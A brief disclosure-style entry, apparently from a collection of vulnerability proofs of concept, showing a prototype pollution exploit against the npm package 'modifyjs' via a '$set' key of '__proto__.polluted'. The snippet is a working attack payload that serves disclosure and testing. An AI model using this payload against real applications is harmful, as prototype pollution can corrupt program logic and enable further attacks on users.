# modifyjs

- package name: `modifyjs`

- PoC exploit:

```javascript
var modify = require('modifyjs');
modify({}, { $set: { ['__proto__.polluted']: 'yes' } });
// Object.prototype.polluted === 'yes'
```